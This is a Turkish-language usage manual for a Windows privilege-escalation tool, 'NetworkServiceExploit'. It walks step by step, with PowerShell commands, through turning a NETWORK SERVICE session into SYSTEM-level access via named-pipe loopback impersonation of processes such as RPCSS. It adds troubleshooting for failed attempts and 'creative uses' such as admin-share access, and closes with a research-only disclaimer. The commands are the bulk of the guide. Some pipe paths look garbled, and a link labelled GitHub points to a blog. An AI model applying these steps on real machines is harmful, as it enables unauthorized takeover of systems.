# NetworkServiceExploit Kullanım Kılavuzu

## Giriş
`NetworkServiceExploit`, Windows sistemlerinde `NETWORK SERVICE` hesabını kullanarak belirli zafiyetlerden yararlanmayı amaçlayan bir araçtır. Bu araç, `Named Pipes` ve `Impersonation` yöntemlerini kullanarak hedef işlemler üzerinde kontrol sağlamayı ve `SYSTEM` gibi yüksek ayrıcalıklı yetkilere erişmeyi hedefler.

Bu kılavuz, aracın kullanımını ve hedeflerin nasıl başarıyla gerçekleştirileceğini açıklar.

---

## Gereksinimler
- Windows 10 veya daha yeni bir sürüm
- Powershell veya benzeri bir komut satırı aracı
- `SeImpersonatePrivilege` ayrıcalığı olan bir `NETWORK SERVICE` oturumu
- Hedef işlemle aynı oturumda çalışan servisler

---

## Kullanım Adımları

### 1. **Named Pipe Oluşturma ve Dinleme**
Hedef sistemde bir Named Pipe oluşturun ve bağlantı bekleyin:
```powershell
$pipe = New-NtNamedPipeFile \.\pipe\ExploitPipe -Win32Path
$job = Start-Job { $pipe.Listen() }
```
Bu komut, `\.\pipe\ExploitPipe` adında bir Named Pipe oluşturur ve bağlantı bekler.

### 2. **Localhost Üzerinden Bağlantı Açma**
Oluşturulan Named Pipe üzerinden localhost bağlantısı kurun:
```powershell
$file = Get-NtFile \localhost\pipe\ExploitPipe -Win32Path
Wait-Job $job | Out-Null
```
Bu adım, dinleyiciyle bir bağlantı kurar ve bağlantının tamamlanmasını bekler.

### 3. **Hedef İşlemi Açma ve Yetkileri Alma**
`Impersonation` kullanarak hedef işlemi açın ve gerekli yetkileri alın:
```powershell
$p = Use-NtObject($pipe.Impersonate()) { 
    Get-NtProcess -ProcessId <ProcessID>
}
$p.GrantedAccess
```
`<ProcessID>` kısmını hedef işlem kimliği (örneğin, `RPCSS` servisinin ProcessID'si) ile değiştirin. `GrantedAccess` çıktısında `AllAccess` görmeniz gerekiyor.

### 4. **İşlem Yetkilendirmesini Doğrulama**
Alınan `Token` bilgilerini inceleyerek yetkilendirmeyi doğrulayın:
```powershell
$token = Use-NtObject($pipe.Impersonate()) { 
    Get-NtToken -Impersonation 
}
$token.Groups | ? Name -Match Rpcss
```
Bu komut, `NT SERVICE\RpcSs` gibi grupların etkin olduğunu doğrular.

---

## Yaratıcı Kullanımlar
- Hedef oturum üzerinde `SYSTEM` yetkisi elde etmek için Named Pipe üzerinden loopback kimlik doğrulama kullanabilirsiniz.
- `Admin Shares` erişimi sağlamak için `NETWORK SERVICE` hesabını kullanabilirsiniz.

---

## Örnek Kullanım
```powershell
NetworkServiceExploit.exe /pipe:ExploitPipe /process:1152
```
Bu komut, `ExploitPipe` adlı bir Named Pipe oluşturur ve `1152` ID'li işlemi hedefler.

---

## Hata Ayıklama
### 1. **Erişim Hatası**
Eğer bir işlem açarken `Access Denied` hatası alıyorsanız:
- Kullanıcınızın `SeImpersonatePrivilege` ayrıcalığına sahip olduğundan emin olun.
- Hedef işlemin aynı oturumda çalıştığını doğrulayın.

### 2. **Pipe Bağlantısı Sorunları**
Pipe bağlantıları başarısız oluyorsa:
- Named Pipe adının doğru yazıldığından emin olun.
- Hedef sistemin güvenlik ayarlarını kontrol edin.

---

## Güvenlik Notları
Bu araç yalnızca güvenlik araştırmaları ve eğitim amaçlı kullanılmalıdır. Kötüye kullanım durumlarında etik ve yasal sorumluluk kullanıcıya aittir.

---

## İletişim
Bu araç hakkında daha fazla bilgi almak veya geri bildirimde bulunmak için GitHub sayfasını ziyaret edebilirsiniz: [Tyranid's Blog](https://tyranidslair.blogspot.com).
